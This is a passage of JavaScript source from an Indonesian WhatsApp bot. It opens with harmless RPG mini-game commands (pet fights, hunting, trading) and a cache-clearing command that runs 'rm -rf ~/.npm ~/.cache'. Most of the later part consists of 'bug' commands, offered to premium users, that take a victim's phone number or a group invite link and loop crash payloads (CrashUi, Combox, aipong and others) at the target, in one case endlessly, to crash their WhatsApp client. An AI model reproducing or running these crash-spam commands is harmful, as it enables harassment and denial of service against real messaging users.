  reply(`*Pet Kamu* (🦚griffin ${penumpang}) ⚔️menantang 🦚griffinnya *${nogorojo}* (🦚griffin kamu) lagi berkelahi.\n\nTunggu ${lamaPertarungan} menit lagi dan lihat siapa yg menang🎮.`)

  RyuuBotz.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Naikin lagi levelnya😐','Cupu','Kurang hebat','Ampas Petnya','Pet gembel']
  let alasanMenang = ['Hebat','Pro','Ganas Pet','Legenda Pet','Sangat Pro','Rajin Ngasi Makan Pet']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].griffin;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].griffin;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🦚Kamu* (griffin ${global.db.users[m.sender].griffin}) MENANG melawan 🦚griffinnya *${RyuuBotz.getName(lawan)}* (griffin ${global.db.users[lawan].griffin}) karena griffin🦚kamu ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nHadiah Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🦚Kamu* (griffin ${global.db.users[m.sender].griffin}) KALAH melawan 🦚griffinnya *${RyuuBotz.getName(lawan)}* (griffin ${global.db.users[lawan].griffin}) karena pet kamu ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nUang kamu berkurang Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa 😂`)
  }

  delete RyuuBotz.fightnaga[m.sender]
}
break
case 'fightcentaur': 
case 'perangcentaur': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
RyuuBotz.level = global.db.users[m.sender]
  RyuuBotz.fightnaga = RyuuBotz.fightnaga ? RyuuBotz.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof RyuuBotz.fightnaga[m.sender] != "undefined" && RyuuBotz.fightnaga[m.sender] == true) return reply(`*Tidak bisa melakukan battle ⚔️ karena Arena yang kamu miliki dipakai untuk fight pet mu yg lain.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Pet Kamu* (🐴centaur ${penumpang}) ⚔️menantang 🐴centaurnya *${nogorojo}* (🐴centaur kamu) lagi berkelahi.\n\nTunggu ${lamaPertarungan} menit lagi dan lihat siapa yg menang🎮.`)

  RyuuBotz.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Naikin lagi levelnya😐','Cupu','Kurang hebat','Ampas Petnya','Pet gembel']
  let alasanMenang = ['Hebat','Pro','Ganas Pet','Legenda Pet','Sangat Pro','Rajin Ngasi Makan Pet']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].centaur;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].centaur;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🐴Kamu* (centaur ${global.db.users[m.sender].centaur}) MENANG melawan 🐴centaurnya *${RyuuBotz.getName(lawan)}* (centaur ${global.db.users[lawan].centaur}) karena centaur🐴kamu ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nHadiah Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🐴Kamu* (centaur ${global.db.users[m.sender].centaur}) KALAH melawan 🐴centaurnya *${RyuuBotz.getName(lawan)}* (centaur ${global.db.users[lawan].centaur}) karena pet kamu ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nUang kamu berkurang Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa 😂`)
  }

  delete RyuuBotz.fightnaga[m.sender]
}
break

case 'berburu': {
  if (!m.isGroup) return reply(mess.only.group)
    function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = RyuuBotz.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Berburu'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi : {}
    if (id in RyuuBotz.misi) {
        return replyReinzID( `Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
     }
    if (new Date - user.lastmisi > 3600000) {
		let hewan1 = Math.floor(Math.random() * 10)
		let hewan2 = Math.floor(Math.random() * 10)
		let hewan3 = Math.floor(Math.random() * 10)
		let hewan4 = Math.floor(Math.random() * 10)
		let hewan5 = Math.floor(Math.random() * 10)
		let hewan6 = Math.floor(Math.random() * 10)
		let hewan7 = Math.floor(Math.random() * 10)
		let hewan8 = Math.floor(Math.random() * 10)
		let hewan9 = Math.floor(Math.random() * 10)
		let hewan10 = Math.floor(Math.random() * 10)
		let hewan11 = Math.floor(Math.random() * 10)
		let hewan12 = Math.floor(Math.random() * 10)
		
		let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : RyuuBotz.getName(m.sender)}* 
${hewan1 ? `
🐂 Banteng: ${hewan1}` : ''} ${hewan2 ? `
🐅 Harimau: ${hewan2}` : ''} ${hewan3 ? `
🐘 Gajah: ${hewan3}` : ''} ${hewan4 ? `
🐐 Kambing: ${hewan4}` : ''} ${hewan5 ? `
🐼 Panda: ${hewan5}` : ''} ${hewan6 ? `
🐊 Buaya: ${hewan6}` : ''} ${hewan7 ? `
🐃 Kerbau: ${hewan7}` : ''} ${hewan8 ? `
🐮 Sapi: ${hewan8}` : ''} ${hewan9 ? `
🐒 Monyet: ${hewan9}` : ''} ${hewan10 ? `
🐗 Babi Hutan: ${hewan10}` : ''} ${hewan11 ? `
🐖 Babi: ${hewan11}` : ''} ${hewan12 ? `
🐓 Ayam: ${hewan12}` : ''}
`.trim()

		user.banteng += hewan1
		user.harimau += hewan2
		user.gajah += hewan3
		user.kambing += hewan4
		user.panda += hewan5
		user.buaya += hewan6
		user.kerbau += hewan7
		user.sapi += hewan8
		user.monyet += hewan9
		user.babihutan += hewan10
		user.babi += hewan11
		user.ayam += hewan12
		
		RyuuBotz.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete RyuuBotz.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			replyReinzID(`${hsl}`)
		}, 20000)

		setTimeout(() => {
			replyReinzID(`Nah ini dia`)
		}, 18000)

		setTimeout(() => {
			replyReinzID('Dorr🔥')
		}, 15000)

		setTimeout(() => {
			replyReinzID('Dapat Sasaran')
		}, 14000)

		setTimeout(() => {
			replyReinzID('Sedang mencari mangsa...')
		}, 0)
		user.lastmisi = new Date * 1
	} else replyReinzID(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

//=========================================\\
case 'polisi': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = RyuuBotz.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Polisi'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi: {}
    if (id in RyuuBotz.misi) {
        replyReinzID(`Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 10)
        let randomaku2 = Math.floor(Math.random() * 10)

        let rbrb1 = (randomaku1 * 100000)
        let rbrb2 = (randomaku2 * 1000)

        var dimas = `
👮Mengejar Pencuri....
`.trim()

        var dimas2 = `
👮Menangkap pencuri....
`.trim()

        var dimas3 = `
🚔Membawa ke kantor polisi\nDan di penjara
`.trim()

        var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

        var hsl = `
*—[ Hasil Polisi ${name} ]—*
➕ 💹 Uang = [ ${rbrb1} ]
➕ ✨ Exp = [ ${rbrb2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

        user.money += rbrb1
        user.exp += rbrb2
        user.ojekk += 1

        RyuuBotz.misi[id] = [
            kerja,
            setTimeout(() => {
delete RyuuBotz.misi[id]
            }, 27000)
        ]

        setTimeout(() => {
            replyReinzID(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replyReinzID(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replyReinzID(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
           replyReinzID(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replyReinzID(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replyReinzID('??Sedang Berpatroli.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replyReinzID(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=========================================\\
// let pajak = 0.02
case 'berdagang': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

    let dapat = (Math.floor(Math.random() * 5000))
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) return replyReinzID ('Tag salah satu lah, yang kamu ingin berdagang bareng')
    if (typeof db.users[who] == 'undefined') return replyReinzID('Pengguna tidak ada didalam data base')
    let __timers = (new Date - global.db.users[m.sender].lastdagang)
    let _timers = (28800000 - __timers)
    let timers = clockString(_timers)
    let users = global.db.users
    let username = RyuuBotz.getName(who)
    if (new Date - global.db.users[m.sender].lastdagang > 28800000) {
        if (4999 > users[who].money) return replyReinzID ('Target tidak memiliki modal harap masukkan modal 5000')
        if (4999 > users[m.sender].money) return replyReinzID ('kamu tidak memiliki modal harap masukkan modal 5000')
        users[who].money -= dapat * 1
        users[m.sender].money -= dapat * 1
        global.db.users[m.sender].lastdagang = new Date * 1
        replyReinzID(`Mohon tunggu kak..\nKamu dan @${who.replace(/@.+/, '')} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
        setTimeout(() => {
            replyReinzID(m.chat, `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 3600000)
        setTimeout(() => {
            replyReinzID(`Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 7200000)
        setTimeout(() => {
            replyReinzID( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 10800000)
        setTimeout(() => {
            replyReinzID( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 14400000)
        setTimeout(() => {
            replyReinzID( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 18000000)
        setTimeout(() => {
            replyReinzID( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 21600000)
        setTimeout(() => {
            replyReinzID( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 25200000)
        setTimeout(() => {
            replyReinzID( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +10000\n${users[m.sender].money += 10000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +100000\n${users[who].money += 100000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 28800000)
    } else replyReinzID(`Anda Sudah Berdagang , tunggu ${timers} lagi..`)

}
break

//=========================================\\
case 'merampok':
  case 'rampok': {
    if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}

function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let dapat = (Math.floor(Math.random() * 100000))
    let users = global.db.users
    let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    if (!who) return replyReinzID('Tag orang yang mau kamu Rampok!')
    if (typeof global.db.users[who] == 'undefined') return replyReinzID('Pengguna tidak ada didalam database')
    if (users[who].level > users[m.sender].level) return replyReinzID(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
    let __timers = (new Date - global.db.users[m.sender].lastrampok)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    if (new Date - global.db.users[m.sender].lastrampok > 3600000) {
        if (10000 > users[who].money) return replyReinzID('ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ')
        users[who].money -= dapat * 1
        users[m.sender].money += dapat * 1
        global.db.users[m.sender].lastrampok = new Date * 1
        replyReinzID( `ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`)
    } else replyReinzID( `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`)
}
break
//=========================================\\
case 'clearcache':
case 'cleancache': 
case 'buangsampah': {
  const fs = require('fs')
  const path = require('path')
  const { exec } = require('child_process')
  const mediaDir = './node_modules/Arisu-MD/'

  try {
    reply('🚮 Sedang membersihkan cache dan file media...')

    // 1. Hapus cache dari direktori sistem
    exec('rm -rf ~/.npm ~/.cache', (err, stdout, stderr) => {
      if (err || stderr) {
        console.error(err || stderr)
        reply(`⚠️ Ada masalah saat menghapus cache:\n${err?.message || stderr}`)
      } else {
        reply('✅ Cache direktori `.npm` & `.cache` berhasil dibersihkan.')
      }
    })

    // 2. Hapus file media dari ./node_modules/Arisu-MD/home/container
    const extensionsToDelete = [
      // Audio
      '.mp3', '.aac', '.wav', '.flac', '.alac', '.ogg', '.opus', '.wma', '.m4a', '.aiff',
      // Video
      '.mp4', '.mkv', '.webm', '.mov', '.avi', '.wmv', '.flv', '.3gp', '.mpeg', '.mpg', '.ts', '.m4v',
      // Gambar
      '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.tif', '.svg', '.heic', '.heif', '.raw', '.ico'
    ]

    let deleted = 0
    const files = fs.readdirSync(mediaDir)
    for (const file of files) {
      const ext = path.extname(file).toLowerCase()
      if (extensionsToDelete.includes(ext)) {
        fs.unlinkSync(path.join(mediaDir, file))
        deleted++
      }
    }

    reply(`🧹 ${deleted} file media juga berhasil dibersihkan dari folder *container*!`)
  } catch (e) {
    console.error(e)
    reply('❌ Terjadi kesalahan saat pembersihan.')
  }
}
break
case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replyReinzID('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return replyReinzID(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replyReinzID(`${teks}`) 
await sleep(2000)
replyReinzID("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replyReinzID("Berhasil menghapus semua Kenangan di folder session")     
});
}
break
//======================================================================
case 'amountbug': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break
//======================================================================
//bug cases
case 'xandroid': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'xios': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'xios2':
  {
	if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
  }
  break;
  case 'xandroid2':
  {
	if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
  }
  break;
  case 'xgc':
  {
    if (!isPrem) return replyprem(mess.premium)
    if (!text) {
      return replyReinzID("*CARA KIRIM BUG KE GRUB*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika Anda ingin mengirimkan bug dalam jumlah banyak, silakan ketik seperti berikut\n\nEx: ." + command + " linkgc jumlah\n\nContoh:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replyReinzID("mohon tunggu, "+command+" bug sedang dalam proses..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replyReinzID("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await RyuuBotz.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replyReinzID("*DONEâœ… BUG TELAH DIKIRIM KE GRUP!.*");
      RyuuBotz.groupLeave(groupTarget);
    } catch (error) {
      replyReinzID(util.format(error));
    }
  } 
  break;
  case 'ryu-crash': {
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break;
  case 'systemuicrash': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'ryu-vip': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'xsysui': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 100; i++) {
await Combox2(target)
await Combox3(target)
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'ioskill': case 'iosx': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`gunakan dengan cara .${command} 916909137213`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return reply(`Contoh : .${command} 916909137213`)
await reply(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
